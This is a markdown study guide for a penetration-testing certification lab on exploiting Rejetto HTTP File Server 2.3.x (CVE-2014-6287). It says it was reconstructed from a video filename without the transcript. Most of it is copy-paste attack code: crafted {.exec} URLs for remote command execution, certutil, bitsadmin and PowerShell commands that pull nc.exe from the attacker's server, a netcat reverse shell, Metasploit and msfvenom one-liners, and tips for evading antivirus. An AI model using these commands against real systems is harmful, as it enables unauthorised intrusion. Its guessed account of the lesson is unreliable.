# 01 – Exploiting a Vulnerable HTTP File Server (Windows)

Note: The transcript is not provided. The following notes are based on the filename and common eJPT lab patterns for exploiting Rejetto HTTP File Server (HFS) 2.3/2.3b via CVE-2014-6287. Commands and steps are conservative and copy-paste ready.

## What the video covers (Introduction / big picture)
- Recon a Windows target, identify an HTTP File Server (HFS) service.
- Recognize the vulnerable Rejetto HFS 2.3/2.3b and confirm remote command execution (RCE).
- Two exploitation paths:
  - Metasploit: exploit/windows/http/rejetto_hfs_exec for instant shell.
  - Manual: Craft the HFS macro exec payload to run cmd.exe and pull a reverse shell using certutil/PowerShell.
- Get an initial shell, verify access, basic stabilization.

## Flow (ordered)
1. Discover open ports and services with Nmap.
2. Identify HFS on port 80 (banner/title shows HFS 2.3.x).
3. Verify vulnerability and locate exploit (searchsploit/metasploit).
4. Prepare listener and a simple HTTP server to host payload.
5. Option A: Use Metasploit rejetto_hfs_exec for Meterpreter/shell.
6. Option B: Manual RCE via crafted URL to:
   - Test RCE (whoami/ping).
   - Download nc.exe (or custom EXE) with certutil.
   - Execute reverse shell back to your listener.
7. Stabilize and perform quick post-exploitation checks.

## Tools highlighted
- nmap (service/version scan)
- web browser or curl (to interact with HFS)
- searchsploit (enumerate public exploits)
- msfconsole (Metasploit module: exploit/windows/http/rejetto_hfs_exec)
- python3 -m http.server (host payload)
- nc/rlwrap nc (listener)
- PowerShell, certutil (on target, to download/execute payload)
- Optional: msfvenom (generate a custom Windows reverse shell EXE)

## Typical command walkthrough (detailed, copy-paste friendly)

Set helper variables first (adjust IPs/ports):
```bash
# Attacker box (Kali/Parrot/etc.)
export TGT=10.10.10.10          # Target IP
export LHOST=10.10.14.5         # Your VPN/tun IP
export LPORT=4444               # Listener port
mkdir -p scans loot payloads
```

1) Recon and identification
```bash
# Full TCP scan + default scripts + versions
nmap -sC -sV -p- -oN scans/all_tcp.txt $TGT

# If port 80 shows HFS 2.3.x in http-title or header, confirm in the browser:
# http://$TGT/
```

2) Look up the exploit (informational)
```bash
searchsploit hfs rejetto
# Expect to see: "Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution"
```

3) Prepare infrastructure (listener + payload hosting)
```bash
# Start a reverse shell listener
rlwrap nc -lvnp $LPORT
# In a new terminal, host a payload directory
cd payloads
# Option A: use nc.exe shipped with Kali
cp /usr/share/windows-resources/binaries/nc.exe ./ 2>/dev/null || true
# Option B (if nc.exe not available), generate a custom reverse shell EXE:
# msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe
python3 -m http.server 8000
```

4) Option A: Metasploit exploitation (quick win)
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS $TGT
set RPORT 80
set TARGETURI /
# Choose payload (x86 is broadly compatible)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run
# If session opens, interact and proceed.
```

5) Option B: Manual exploitation (craft HFS macro exec)
- Test RCE (use -g to disable curl URL globbing and --path-as-is to keep braces intact):
```bash
# whoami via HFS macro exec
curl -s -g --path-as-is "http://$TGT:80/?search=%00{.exec|cmd.exe%20/c%20whoami}"

# ICMP test back to you (watch tcpdump in another terminal)
sudo tcpdump -ni any icmp &
curl -s -g --path-as-is "http://$TGT:80/?search=%00{.exec|cmd.exe%20/c%20ping%20-n%201%20$LHOST}"
```

- Download nc.exe to a writable path with certutil:
```bash
# Put nc.exe at C:\Users\Public\nc.exe (commonly writable)
curl -s -g --path-as-is "http://$TGT:80/?search=%00{.exec|cmd.exe%20/c%20certutil.exe%20-urlcache%20-split%20-f%20http://$LHOST:8000/nc.exe%20C:\Users\Public\nc.exe}"
```

- Execute reverse shell back to your listener:
```bash
curl -s -g --path-as-is "http://$TGT:80/?search=%00{.exec|cmd.exe%20/c%20C:\Users\Public\nc.exe%20-e%20cmd.exe%20$LHOST%20$LPORT}"
# Check your nc listener for a connection
```

Alternative manual payloads (if certutil blocked):
```bash
# Bitsadmin (older Windows; may still work)
curl -s -g --path-as-is "http://$TGT/?search=%00{.exec|cmd.exe%20/c%20bitsadmin%20/Transfer%20myJob%20/Download%20/priority%20normal%20http://$LHOST:8000/nc.exe%20C:\Users\Public\nc.exe}"

# PowerShell direct download (if PowerShell available)
# Downloads to temp and runs directly (no quotes needed when URL-encoded)
curl -s -g --path-as-is "http://$TGT/?search=%00{.exec|powershell.exe%20-NoP%20-W%20Hidden%20-c%20Invoke-WebRequest%20-UseBasicParsing%20-Uri%20http://$LHOST:8000/nc.exe%20-OutFile%20C:\Users\Public\nc.exe}"
```

6) Post-access quick checks and stabilization
```cmd
# In the reverse shell (cmd.exe on target):
whoami
hostname
ver
ipconfig /all
# Optional: switch to PowerShell for a nicer environment
powershell -nop
```

7) Cleanup (optional)
```bash
# From your reverse shell:
del C:\Users\Public\nc.exe
# Or rename/move if persistence desired (lab-dependent)
```

## Practical tips
- HFS fingerprint: Nmap http-title or visiting root typically shows “HFS 2.3” (Rejetto). The vulnerable versions are 2.3/2.3a/2.3b.
- Use curl -g or quote the URL to avoid brace expansion; add --path-as-is so curl doesn’t normalize the path.
- Always URL-encode spaces as %20 and special characters when crafting the search payload.
- Verify RCE with a low-noise command first (whoami, ping -n 1 LHOST, or an HTTP callback via Invoke-WebRequest).
- Choose egress-friendly ports (80/443/8080) if 4444 is blocked.
- Writable paths: C:\Users\Public\ or C:\Windows\Temp\ work on most systems.
- If AV/Defender blocks downloads, try a different filename/location, use PowerShell one-liners, or msfvenom for custom EXEs.
- If Metasploit payload fails, try a plain cmd reverse shell payload (windows/shell_reverse_tcp) or the manual certutil + nc approach.
- For better shell UX on Linux, use rlwrap with nc. On Windows, upgrade to PowerShell by typing powershell.

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
export TGT=10.10.10.10; export LHOST=10.10.14.5; export LPORT=4444

# Recon
nmap -sC -sV -p- -oN nmap.txt $TGT

# Infra
rlwrap nc -lvnp $LPORT &
(cd payloads && cp /usr/share/windows-resources/binaries/nc.exe . 2>/dev/null || true; python3 -m http.server 8000) &

# RCE test
curl -s -g --path-as-is "http://$TGT/?search=%00{.exec|cmd.exe%20/c%20whoami}"

# Download nc.exe
curl -s -g --path-as-is "http://$TGT/?search=%00{.exec|cmd.exe%20/c%20certutil.exe%20-urlcache%20-split%20-f%20http://$LHOST:8000/nc.exe%20C:\Users\Public\nc.exe}"

# Reverse shell
curl -s -g --path-as-is "http://$TGT/?search=%00{.exec|cmd.exe%20/c%20C:\Users\Public\nc.exe%20-e%20cmd.exe%20$LHOST%20$LPORT}"
```

Metasploit quick:
```bash
msfconsole -q -x "use exploit/windows/http/rejetto_hfs_exec; set RHOSTS $TGT; set RPORT 80; set TARGETURI /; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
```

## Summary
- The video likely demonstrates exploiting Rejetto HTTP File Server (HFS) 2.3.x on Windows using CVE-2014-6287.
- Identify HFS via Nmap/http-title, then gain RCE either with Metasploit’s exploit/windows/http/rejetto_hfs_exec or a manual crafted URL that triggers HFS’s {.exec} macro.
- For a manual shell, use certutil to fetch nc.exe (or a msfvenom EXE) to C:\Users\Public\ and execute it to your nc listener.
- Keep payloads simple, URL-encode carefully, and use egress-friendly ports. Clean up artifacts after obtaining access.